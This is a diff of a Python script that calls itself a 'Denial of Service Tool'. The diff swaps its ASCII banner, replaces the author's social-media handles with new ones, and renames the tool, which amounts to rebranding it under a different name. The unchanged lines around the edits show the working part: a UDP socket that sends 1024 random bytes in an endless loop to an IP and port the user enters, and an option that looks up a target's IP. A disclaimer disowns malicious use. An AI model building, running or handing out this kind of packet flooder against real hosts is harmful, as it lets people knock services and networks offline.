@@ -8,26 +8,24 @@ import colorama
 from colorama import Fore,Back, Style
 print(Fore.MAGENTA)
 
-print(r"""⠀⠀⠀⠀⠀⠀⠀6⢠⠣⡑⡕⡱⡸⡀⡢⡂⢨⠀⡌⠀⠀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠀⡕⢅⠕⢘⢜⠰⣱⢱⢱⢕⢵⠰⡱⡱⢘⡄⡎⠌⡀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠱⡸⡸⡨⢸⢸⢈⢮⡪⣣⣣⡣⡇⣫⡺⡸⡜⡎⡢⠀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⢱⢱⠵⢹⢸⢼⡐⡵⣝⢮3⢖⢯⡪⡲⡝⠕⣝⢮⢪⢀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⢀⠂⡮⠁⠐⠀⡀⡀⠑⢝⢮⣳⣫⢳⡙⠐⠀⡠⡀⠀⠑⠀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⢠⠣⠐⠀ ⭕ ￼ ⠀⠀⢪⢺⣪⢣⠀⡀ ⭕     .⠈⡈⠀⡀⠀⠀ 
-⠀⠀⠀⠀⠐⡝⣕⢄⡀⠑⢙⠉⠁⡠⡣⢯⡪⣇⢇⢀⠀⠡⠁⠁⡠⡢⠡⠀⠀⠀ 
-⠀⠀⠀⠀⠀⢑⢕⢧⣣⢐⡄⣄⡍⡎⡮⣳⢽⡸⡸⡊⣧⣢⠀⣕⠜⡌⠌⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠌⡪⡪⠳⣝⢞⡆⡇⡣x⡯⣞⢜⡜⡄⡧⡗⡇⠣⡃⡂⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠀⠨⢊⢜⢜⣝⣪⢪⠌⢩⢪⢃⢱⣱⢹⢪⢪⠊⠀⠀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠀⠀⠐⠡⡑⠜⢎⢗⢕⢘⢜⢜⢜⠜⠕⠡⠡⡈⠀⠀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡢⢀⠈⠨⣂⡐7⢅⢕⢐⠁⠡⠡⢁⠀⠀⠀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠢⠀⡀⡐⡍⢪⢘⠀⠀⠡⡑⡀⠀⠀⠀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠨⢂⠀⠌⠘a⢜⠘⠀⢌⠰⡈⠀⠀⠀⠀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢑⢸⢌⢖⢠⢀⠪⡂""")
+print(r"""  .,-:::::.-:.     ::-.:::::::..    ...    :::
+,;;;'````' ';;.   ;;;;';;;;``;;;;   ;;     ;;;
+[[[          '[[,[[['   [[[,/[[['  [['     [[[
+$$$            c$$"     $$$$$$c    $$      $$$
+`88bo,__,o,  ,8P"`      888b "88bo,88    .d888
+  "YUMMMMMP"mM"         MMMM   "W"  "YmmMMMM""
+""")
+print(Fore.RED)
 print("\n****************************************************************")
+print(Fore.BLACK)
 print("\n* Socials                                                      *")
-print("\n* https://www.twitter.com/63x7a                                *")
-print("\n* https://www.github.com/63x7a                                 *")
+print(Fore.LIGHTYELLOW_EX)
+print("\n* https://www.twitter.com/0xCyru                               *")
+print(Fore.CYAN)
+print("\n* https://www.github.com/0xCyru                                *")
+print(Fore.CYAN)
 print("\n****************************************************************")
+print(Fore.LIGHTMAGENTA_EX)
 print('\n')
 print("This script is NOT meant to be used in any malicious way, I am not responsible how you use this.")
 print('\n')
@@ -40,19 +38,18 @@ if option == '1':
     print("Target IP is", socket.gethostbyname(target))
 elif option == '2':
 
-    print(r""" ______   _______  _______ 
-(  __  \ (  ___  )(  ____ \
-| (  \  )| (   ) || (    \/
-| |   ) || |   | || (_____ 
-| |   | || |   | |(_____  )
-| |   ) || |   | |      ) |
-| (__/  )| (___) |/\____) |
-(______/ (_______)\_______)
+    print(r"""                                
+    //    ) ) //   ) ) //   ) ) 
+   //    / / //   / / ((        
+  //    / / //   / /    \\      
+ //    / / //   / /       ) )   
+//____/ / ((___/ / ((___ / /    
+
 
 """)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
-print("cz's Denial of Service Tool")
+print("Cyru - Denial of Service Tool")
 
 print('\n')
 
@@ -77,4 +74,3 @@ while True:
         print("Sent packets", (sent, ip_add_entered, p0rt))
     except KeyboardInterrupt:
         exit()
-
